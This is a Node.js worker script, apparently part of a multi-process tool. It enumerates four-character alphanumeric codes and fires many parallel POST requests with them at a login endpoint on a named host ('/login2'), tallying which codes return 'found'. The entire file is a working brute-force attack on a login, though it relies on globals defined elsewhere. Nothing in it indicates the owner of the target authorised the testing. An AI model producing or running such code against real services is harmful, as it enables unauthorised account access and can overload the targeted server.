'use strict';

let params;
let statistics = {
    firstCode: null,
    code: null,
    finished: false,
    sinceLast: {
        succeededRequests: 0,
        failedRequests: 0,
        found: 0
    },
    total: {
        succeededRequests: 0,
        failedRequests: 0,
        found: 0
    }
}

process.on( 'message', ( msg ) => {
    switch( msg.type ) {
        case 'params':
            params = msg.data;
            start();
            break;
    }
});

process.send({
    type: 'ready',
    data: statistics
});

function start() {
    statistics.firstCode = decToChar( params.offset );

    let codeGen = code(params);
    let startTime = Date.now();

    let queue = [];

    for( let i = 0; i < connectionsPerWorker; i++ ) {
        queue.push( new AsyncLoop({
            loop: doRequest,
            pass: {
                requestOptions: {
                    hostname: 'new.maxkl.de',
                    port: 8080,
                    path: '/login2',
                    method: 'POST',
                    headers: {
                        'Accept': 'application/x-www-form-urlencoded',
                        'Content-Type': 'application/json'
                    },
                    agent: httpAgent
                },
                codeGen: codeGen
            }
        }));
    }

    process.send({
        type: 'start',
        statistics: statistics
    });

    let iv = setInterval(function () {
        process.send({
            type: 'statistics',
            data: statistics
        });
        statistics.sinceLast.succeededRequests = 0;
        statistics.sinceLast.failedRequests = 0;
        statistics.sinceLast.found = 0;
    }, 1000);

    Promise.all( queue ).then(() => {
        statistics.finished = true;
        process.send({
            type: 'end',
            statistics: statistics,
            time: Date.now() - startTime
        });
        clearTimeout( iv );
    });
}

function decToChar( input ) {
    let output = [];
    let decimal = parseInt(input);

    if( decimal === 0 ) {
        output.push('0');
    }

    for( decimal; decimal > 0; decimal = Math.floor(decimal / chars.length) ) {
        output.push(chars[decimal % chars.length]);
    }

    return output.reverse().join('');
}

function* code( params ) {
    for( let i = params.offset; i < params.offset + params.range; i++) {
        statistics.code = decToChar( i );
        yield statistics.code;
    }
}

function AsyncLoop( params ) {
    return new Promise(function(resolve, reject) {
        add( params.loop );
// console.log( params );
        function add( next ) {
            next( params.pass ).then(( next ) => {
                add( next );
            }, function () {
                resolve(true);
            });
        }
    });
}

function doRequest( data ) {
    return new Promise((resolve, reject) => {
        let code = ('000' + data.codeGen.next().value).slice(-4);

        if( typeof code !== 'undefined' ) {
            let req = http.request( data.requestOptions, (res) => {
                let data = '';

                res.setEncoding('utf-8');
                res.on( 'data', (chunk) => {
                    data += chunk;
                });
                res.on( 'end', () => {
                    if( code === '00m7' ) {
                        console.log( data );
                    }

                    if( JSON.parse( data ).found === true ) {
                        statistics.total.found++;
                        statistics.sinceLast.found++;
                    }
                    statistics.total.succeededRequests++;
                    statistics.sinceLast.succeededRequests++;
                    resolve( doRequest );
                });
            });
            req.on( 'error', (e) => {
                statistics.total.failedRequests++;
                statistics.sinceLast.failedRequests++;
            });
            req.write(JSON.stringify({
                code: code
            }));
            req.end();
        } else {
            data.requestOptions.agent.destroy();
            reject();
        }
    });
}
